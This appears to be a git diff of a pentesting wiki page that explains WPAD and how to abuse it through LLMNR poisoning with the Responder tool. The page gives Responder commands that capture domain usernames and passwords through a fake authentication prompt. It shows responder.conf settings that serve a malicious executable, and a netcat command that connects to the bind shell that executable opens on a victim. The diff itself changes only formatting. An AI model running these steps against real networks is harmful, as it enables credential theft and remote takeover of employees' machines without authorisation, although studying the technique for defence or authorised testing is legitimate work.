@@ -2,15 +2,15 @@
 
 ## WPAD
 
-Organisations allow employees to access the internets through proxy servers to increase performance, ensure security and track traffic.Users who connected to the corporate network need to know proxy server for specific URL without doing configuration. The Web Proxy Auto-Discovery Protocol \(WPAD\) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.
+Organisations allow employees to access the internets through proxy servers to increase performance, ensure security and track traffic.Users who connected to the corporate network need to know proxy server for specific URL without doing configuration. The Web Proxy Auto-Discovery Protocol (WPAD) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.
 
-### How WPAD works <a id="how-wpad-works"></a>
+### How WPAD works <a href="#how-wpad-works" id="how-wpad-works"></a>
 
 The client wants to access the wpad.dat configuration file for proxy configuration. It searches computers named as “wpad” on the local network to find this file. And then following steps are carried out:
 
-1. If the DHCP Server is configured, the client retrieves the wpad.dat file from the DHCP Server \(if successful, step 4 is taken\)
-2. The wpad.corpdomain.com query is sent to the DNS server to find the device that is distributing the Wpad configuration. \(If successful, step 4 is taken\)
-3. Sent LLMNR query for WPAD \(if success, go step 4 else proxy can’t be use\)
+1. If the DHCP Server is configured, the client retrieves the wpad.dat file from the DHCP Server (if successful, step 4 is taken)
+2. The wpad.corpdomain.com query is sent to the DNS server to find the device that is distributing the Wpad configuration. (If successful, step 4 is taken)
+3. Sent LLMNR query for WPAD (if success, go step 4 else proxy can’t be use)
 4. Download wpad.dat and use
 
 According to the above sequence, DHCP poisoning attack can be done for the first step. DNS poisoning attack can naturally be performed for the second step. But as I pointed out at the beginning of this article, configured network devices prevent these attacks. When a query is made through the LLMNR, this request will go to every client in the network via broadcast. At this point the attacker sends his wpad.dat file to the clients, acting like a wpad server.
@@ -23,19 +23,19 @@ The important thing is that WPAD protocol is built in Windows operating systems.
 
 #### Responder serves a fake WPAD Server and responds to clients’ WPAD name resolution. The client then requests the wpad.dat file from this fake WPAD Server. Responder creates an authentication screen and asks clients to enter the username and password they use in the domain. Naturally, employees write usernames and passwords used in the domain name. Finally, we can see their username and passwords.
 
- we serve the fake HTTP Server and wait for clear-text passwords.
+&#x20;we serve the fake HTTP Server and wait for clear-text passwords.
 
-```text
+```
 python Responder.py -I eth0 -wFb
 ```
 
 And our victim will see the following dialog box and naturally type the username and password.
 
-![](../../../.gitbook/assets/image%20%28260%29.png)
+![](<../../../.gitbook/assets/image (260).png>)
 
 and we can see the clear-text passwords:
 
-```text
+```
 ---
 snippet
 ---
@@ -65,7 +65,7 @@ snippet
 
 The responder is not only MiTM attack for the WPAD service. It can force victims to downloadinga malicious files by directing ze to a fake web page. Social engineering can be used to realistically prepare the web page to be used for this attack. However, the Responder itself has a fake redirect page as well. All we need to do is make a few changes to the responder.conf file. We set “Serve-HTML” and “Serve-EXE” parameters to “On”.
 
-```text
+```
 [HTTP Server]
 ; Set to On to always serve the custom EXE
 Serve-Always = On
@@ -78,19 +78,17 @@ Serve-Html = On
 
 And we’re starting to run the Responder again.
 
-```text
+```
 python Responder.py -I eth0 -i 10.7.7.31 -r On -w On
 ```
 
 Now, when the victim tries to go out to the internet, ze will only see the following page. And by chance, **the victim clicks on the Proxy Client connection and Bind downloads the CMD Shell, so we can connect to the victim’s 140 connection point with netcat.**
 
-![](../../../.gitbook/assets/image%20%28258%29.png)
+![](<../../../.gitbook/assets/image (258).png>)
 
 
 
-```text
+```
 nc 10.7.7.30 140 -vv
 ```
-
-
 
